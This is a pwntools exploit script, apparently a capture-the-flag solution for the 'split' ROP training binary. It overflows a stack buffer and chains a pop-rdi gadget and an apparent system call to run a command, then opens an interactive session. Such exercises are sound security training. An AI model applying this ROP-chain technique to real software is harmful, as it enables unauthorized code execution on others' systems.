#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template split
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('split')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *0x400741
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

RET = p64(0x40053e)
POP_RDI_RET = p64(0x4007c3)
payload = b'A'*0x28
payload += POP_RDI_RET
payload += p64(0x601060)
payload += RET
payload += p64(0x400560)

io.sendlineafter('> ', payload)
io.recvline()
io.interactive()

